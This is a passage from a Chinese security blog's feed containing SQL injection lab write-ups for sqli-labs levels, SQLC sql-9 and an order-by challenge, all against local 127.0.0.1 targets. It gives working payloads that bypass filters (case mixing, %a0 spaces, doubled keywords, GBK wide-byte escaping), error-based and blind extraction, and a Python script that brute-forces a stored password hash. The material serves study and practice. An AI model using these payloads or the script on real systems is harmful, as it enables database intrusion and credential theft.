different number of columns</span><br><span class=\"line\"></span><br><span class=\"line\">#三个列</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-23/?id=1&#x27; union select 1,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<h2 id=\"绕过andor强过滤\"><a class=\"markdownIt-Anchor\" href=\"#绕过andor强过滤\">#</a> 绕过 and/or 强过滤</h2>\n<p>将 and/or 及其大小写，混合大小写（Or、oR 等）均替换成空</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; aa order by 2 %23</span><br><span class=\"line\">报错，syntax to use near &#x27;aa der by 2 #&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以发现 or 被强制过滤，即任何出现 or 的地方被强制替换成空</p>\n<h3 id=\"绕过方式\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式\">#</a> 绕过方式</h3>\n<p>使用 <code>||</code> 、 <code>oorr</code>  来替代 or，再使用布尔替换 + 报错注入构造查询：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-25/?id=1&#x27; oorr (select extractvalue(1,concat(0x7e,version(),0x7e))) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002142717645.png\" alt=\"image-20221002142717645\"></p>\n<h2 id=\"绕过空格字符\"><a class=\"markdownIt-Anchor\" href=\"#绕过空格字符\">#</a> 绕过空格字符</h2>\n<p>Less-26 为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; %23</span><br><span class=\"line\">报错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; or 1 or &#x27;</span><br><span class=\"line\">错，syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || 1 || &#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>由此，可以构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002143828165.png\" alt=\"image-20221002143828165\"></p>\n<p>空格被过滤</p>\n<h3 id=\"绕过方式-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-2\">#</a> 绕过方式</h3>\n<p>常见的空格替换方式有：</p>\n<ul>\n<li><code>%09</code>  TAB 键 (水平)</li>\n<li><code>%0a</code>  新建一行</li>\n<li><code>%0c</code>  新的一页</li>\n<li><code>%0d</code>  return 功能</li>\n<li><code>%0b</code>  TAB 键 (垂直)</li>\n<li><code>%a0</code>  空格</li>\n<li><code>/**/ </code> 也是一种替代空格方式</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-26/?id=1&#x27; || (select%a0extractvalue(1,concat(0x7e,version(),0x7e))) || &#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002144131652.png\" alt=\"image-20221002144131652\"></p>\n<h2 id=\"绕过一些对于select-union的限制\"><a class=\"markdownIt-Anchor\" href=\"#绕过一些对于select-union的限制\">#</a> 绕过一些对于 select、union 的限制</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; or 1 or &#x27; %23</span><br><span class=\"line\">syntax to use near &#x27;or1or&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>基于以上尝试，可以看出空格被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0or%a01%a0or%a0&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p>那么可以有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0order%a0by%a02&#x27; %23</span><br><span class=\"line\">报错，尝试用union select</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; union select 1,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p>可以看出，union 和 select 被过滤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0&quot;union%a0select%a01,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150152965.png\" alt=\"image-20221002150152965\"></p>\n<h3 id=\"绕过方式一-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式一-2\">#</a> 绕过方式一</h3>\n<p>大小写随机替换（可能需要多尝试几次）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0Union%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">报错，syntax to use near &#x27;seLEct�1,2,&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0seLEct%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; UNion sEleCT 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0UNion%a0sEleCT%a01,2,&#x27;</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002150723525.png\" alt=\"image-20221002150723525\"></p>\n<h3 id=\"绕过方式二-2\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式二-2\">#</a> 绕过方式二</h3>\n<p>使用内联注释绕过：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27; /*!union*/ /*!select*/ 1,2,&#x27;</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0/*!union*/%a0/*!select*/%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式三\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式三\">#</a> 绕过方式三</h3>\n<p>使用双写、三写绕过（和绕过方式一一样，这个也需要多次尝试）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#在union任意位置中插入union</span><br><span class=\"line\">union---&gt;un union ion (双写)</span><br><span class=\"line\"></span><br><span class=\"line\">#在select任意位置中插入select</span><br><span class=\"line\">select ---&gt;se select lect(双写) ----&gt; sese select lectlect(三写)</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-27/?id=1&#x27;%a0ununionion%a0seseselectlectlect%a01,2,&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002170323197.png\" alt=\"image-20221002170323197\"></p>\n<h2 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h2>\n<p>MySQL 中，当数据库编码是 GBK 的时候，编码可以表示中文，两个字符代表一个汉字。</p>\n<p>编码范围是：8140-FEFE</p>\n<p>其中，GB2312 的编码范围是：B0A1-F7FE</p>\n<p>Less-32 为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c27</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1&#x27;&quot;</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1\\&#x27;\\&quot;</span><br><span class=\"line\">The Query String you input in Hex becomes : 315c275c22</span><br></pre></td></tr></table></figure>\n<p>可以发现，我们的单引号在服务器后台被 <code>\\号</code> 转义了。</p>\n<h3 id=\"绕过方式-3\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-3\">#</a> 绕过方式</h3>\n<p>观察反斜杠的 hex 值发现是 5c，接下来我们根据 GBK 编码来做单引号逃逸。</p>\n<p><code>815C</code>  在 GBK 编码范围 <code>8140-FEFE</code>  中，因此我们在单引号前加一个 %81，令其与后台的反斜杠组成双字节被解析，从而释放出我们的单引号。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%81&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>同理，在 GBK2312 里行得通吗？答案是肯定的</p>\n<p><code>B15C</code>  在 GB2312 的编码范围 <code>B0A1-F7FE</code>  中，那么：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; %23</span><br><span class=\"line\">Your Login name:Dumb</span><br><span class=\"line\">Your Password:Dumb</span><br><span class=\"line\">Hint: The Query String you input is escaped as : 1�\\&#x27; #</span><br></pre></td></tr></table></figure>\n<p>因此就可以：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 3%23</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=1%B1&#x27; order by 4%23-----报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-32/?id=-1%B1&#x27; union select 1,2,version()%23</span><br><span class=\"line\">Your Login name:2</span><br><span class=\"line\">Your Password:5.1.73-community</span><br></pre></td></tr></table></figure>\n<h2 id=\"过滤函数绕过\"><a class=\"markdownIt-Anchor\" href=\"#过滤函数绕过\">#</a> 过滤函数绕过</h2>\n<p>以 SQLC-sql9 为例</p>\n<p>输入 admin、admin 结果报错</p>\n<p><img src=\"image-20221002173314221.png\" alt=\"image-20221002173314221\"></p>\n<p>直接上 BurpSuit，抓包送入 Repeater</p>\n<p><img src=\"image-20221002173445571.png\" alt=\"image-20221002173445571\"></p>\n<p>输入单引号，报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=admin&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002173656791.png\" alt=\"image-20221002173656791\"></p>\n<p>我们直接送入 Intruder 进行特殊字符爆破，看看都过滤了哪些字符</p>\n<p><img src=\"image-20221002174151275.png\" alt=\"image-20221002174151275\"></p>\n<p>将特殊字符 load 进来</p>\n<p><img src=\"image-20221002174237643.png\" alt=\"image-20221002174237643\"></p>\n<p>可以看到过滤了空格，逗号等字符【由于环境不一样可能每个人的结果不同，因此不贴图，按照没有空格和逗号展开绕过】</p>\n<p>既然没有空格，我们可以使用 <code>小括号</code> 或者 <code>%a0</code>  代替，这里选择 <code>小括号</code> 。</p>\n<p>既然没有逗号，那么很多函数我们就用不了了，比如 <code>substr</code> 、 <code>extractvalue</code>  等等。</p>\n<p>但是，substr 还有个特性就是 substr (str from n) 表示<strong>从第 n 位到结尾截取字符</strong></p>\n<p>OK，空格和逗号的问题都解决了。<strong>剩下就是搞定注入点</strong>！！！！</p>\n<p><img src=\"image-20221002230320006.png\" alt=\"image-20221002230320006\"></p>\n<p>我们看到 <code>返回包里有个Hint</code> ，由于格式是 <code>大小写</code>  + <code>数字</code>  + <code>==</code> ，我们解码 <code>Base64</code></p>\n<p><img src=\"image-20221002225334319.png\" alt=\"image-20221002225334319\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$query=&quot;SELECT * FROM admin WHERE uname=&#x27;&quot;.$uname.&quot;&#x27;&quot;;if ($row[&#x27;passwd&#x27;]===$passwd)&#123;$_SESSION[&#x27;flag&#x27;] = 1;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式-4\"><a class=\"markdownIt-Anchor\" href=\"#绕过方式-4\">#</a> 绕过方式</h3>\n<p>也就是说，<strong>uname 是用单引号包裹</strong>，所以我们可以用<strong>单引号去闭合</strong> ——</p>\n<p>使用 <code>' = 1 = '</code>  绕过：因为 <code>uname='' = 1 </code> 为假， <code>假 = ''</code>  为真</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#原理核心，和 &#x27; or 1 or &#x27; 异曲同工</span><br><span class=\"line\">uname=&#x27;= (1) =&#x27;&amp;passwd=admin</span><br><span class=\"line\"></span><br><span class=\"line\">#那么就可以有如下注入点：</span><br><span class=\"line\">uname=&#x27;= (select(1)from(admin)where(length(passwd)=32)) =&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002221112034.png\" alt=\"image-20221002221112034\"></p>\n<p>确定了长度，尝试考虑使用脚本爆破</p>\n<p>关键核心语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=  &#x27;= (select(1)from(admin)where(substr((passwd)from(32))=&#x27;f&#x27;)) =&#x27;</span><br><span class=\"line\">#其中，32需要遍历，&#x27;f&#x27;也需要遍历</span><br><span class=\"line\">#注意，由于使用了substr + from的方式，因此需要&quot;从后向前&quot;盲推字符</span><br></pre></td></tr></table></figure>\n<p>附上脚本：</p>\n<p><code>注意</code> ：post 请求中，如果参数是 &quot;uname=xxxx &amp; passwd=yyyy&quot; 这样的，我们需要在 python 脚本中建立一个字典去匹配。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;password error!!@_@&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-9/login.php&quot;</span></span><br><span class=\"line\">payload = &#123;<span class=\"string\">&quot;uname&quot;</span>: <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tflag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\ttemp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">33</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#flag:c12366feb7373bf6d869ab7d581215cf</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#first reverse cf-&gt;fc</span></span><br><span class=\"line\">\t\t\ttemp = temp + j   <span class=\"comment\">#fcg</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#second reverse gcf</span></span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;uname&#x27;</span>] = <span class=\"string\">&quot;&#x27;= (select(1)from(admin)where(substr((passwd)from(&#123;&#125;))=&#x27;&#123;&#125;&#x27;)) =&#x27;&quot;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">33</span>-i),temp)</span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;passwd&#x27;</span>] = <span class=\"string\">&quot;admin&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">\t\t\tresponse = requests.post(url, data = payload)</span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(response.text)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">\t\t\t\tflag = temp</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;++++&quot;</span>,flag)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#if not found</span></span><br><span class=\"line\">\t\t\ttemp = flag</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;the flag is:&quot;</span>,flag)</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p>格式为 <code>小写</code>  + <code>数字</code> ，属于 <code>md5</code>  加密格式</p>\n<p><a href=\"http://xn--www-x98dz94d51o6v2e.cmd5.com\">那么就有 www.cmd5.com</a></p>\n<p><img src=\"image-20221002231016796.png\" alt=\"image-20221002231016796\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "title": "OrderBy注入",
            "date_published": "2022-10-02T04:59:34.000Z",
            "content_html": "<h1 id=\"有趣的order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#有趣的order-by注入\">#</a> 有趣的 Order by 注入</h1>\n<p>下面介绍几个从 ThreeZh1 师傅那里学到的几个有趣的 SQL 注入</p>\n<h2 id=\"常规order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#常规order-by注入\">#</a> 常规 Order by 注入</h2>\n<p>先来看一下 Order by 注入的原理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT username, password FROM users order by 1 asc;</span><br></pre></td></tr></table></figure>\n<p>这是一个常见的 order by 使用语句，order by 后面的数字 1 是第 1 个列的意思 (<strong>也可以指定列名</strong>)， <code>asc </code> /  <code>desc</code>  指定是升序还是降序。</p>\n<p><code>注意</code> ：在 order by 后面的不会根据计算的结果来排序。</p>\n<p>这里有以下几种方式来进行测试：</p>\n<h3 id=\"order-by-报错注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by-报错注入\">#</a> order by + 报错注入</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-布尔盲注\"><a class=\"markdownIt-Anchor\" href=\"#order-by-布尔盲注\">#</a> order by  + 布尔盲注</h3>\n<p>rand () 会返回一个 0 和 1 之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。</p>\n<p>这里就可以用 mid（也就是 substr 函数）来构造布尔盲注的方式来进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by rand(mid(version(),1,1)=5)</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-0的数-and时间盲注方式\"><a class=\"markdownIt-Anchor\" href=\"#order-by-0的数-and时间盲注方式\">#</a> order by + (&gt;0 的数) +and + 时间盲注方式</h3>\n<p>在 order by 后面的不会根据计算的结果来排序，但是计算还是会运行。</p>\n<p>也就是，当我们的 payload 有延迟命令的时候，页面还是会延迟的。</p>\n<p>使用 and 连接时间盲注 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))</span><br></pre></td></tr></table></figure>\n<p>这里用 <code>sqllib-Less46</code>  作为一个学习的例子：</p>\n<p>它的源代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$id=$_GET[&#x27;sort&#x27;];</span><br><span class=\"line\">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115154304.png\" alt=\"image-20221002115154304\"></p>\n<p>那么可以 <code>将这个1替换成查询语句</code> ，因为 <code>查询成功</code> 的结果就是 <code>返回1</code></p>\n<p><code>注意</code> ：如果对上述这一句有疑问，请看下图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = (select 2)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120406540.png\" alt=\"image-20221002120406540\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120420706.png\" alt=\"image-20221002120420706\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 2</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120434503.png\" alt=\"image-20221002120434503\"></p>\n<p>OK，那就可以有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115341706.png\" alt=\"image-20221002115341706\"></p>\n<p>读表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115558719.png\" alt=\"image-20221002115558719\"></p>\n<h2 id=\"另外一种order-by-注入\"><a class=\"markdownIt-Anchor\" href=\"#另外一种order-by-注入\">#</a> 另外一种 Order by 注入</h2>\n<p>ThreeZh1 自己写了一个题来学习这一种 order by 注入。</p>\n<p>题目过滤了 F1g3 这个字段名。 <code>在id=3时</code> ，F1g3 字段存在 flag 的 base16 编码。(直接过滤 Flag 会更好)</p>\n<p>查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;;</span><br></pre></td></tr></table></figure>\n<p>已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为 2</p>\n<p>因为过滤了 F1ag 这个字段名，我们不能直接用普通盲注的方式得到 F1ag，所以就得使用一种特别的 order by 盲注。</p>\n<p><img src=\"image-20221002120830210.png\" alt=\"image-20221002120830210\"></p>\n<h3 id=\"尝试报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试报错\">#</a> 尝试报错</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入</p>\n<p><img src=\"image-20221002120931642.png\" alt=\"image-20221002120931642\"></p>\n<h3 id=\"尝试不报错\"><a class=\"markdownIt-Anchor\" href=\"#尝试不报错\">#</a> 尝试不报错</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 #</span><br><span class=\"line\">不报错</span><br></pre></td></tr></table></figure>\n<h3 id=\"尝试获取列数\"><a class=\"markdownIt-Anchor\" href=\"#尝试获取列数\">#</a> 尝试获取列数</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 3 #</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 4 #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>获取列数为 3</p>\n<h3 id=\"尝试获取数据库版本\"><a class=\"markdownIt-Anchor\" href=\"#尝试获取数据库版本\">#</a> 尝试获取数据库版本</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #</span><br><span class=\"line\">id: 1 name: oops,This is not the flag id </span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>既然，直接报错注入的方式不可行，那么我们换一种思路，用 order by</p>\n<p>可以直接用 order by 么？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>服，那就尝试先来排序。由于 id=1、id=2 时，都不是 flag 所对应的 id，根据题目，我们知道 flag 在 id=3 所在行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id=3 union select 1,2,3 order by 1</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">id=3 union select 4,2,3 order by 1</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 4 name: 3 </span><br></pre></td></tr></table></figure>\n<p>根据这个差异，我们可以指定 <code>按第二列</code> 来排序，并在 select 里猜测 flag 的首字符值。这样就可以不使用 F1ag 这个字段名就把值读出来。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;6&#x27;,3 order by 2</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;7&#x27;,3 order by 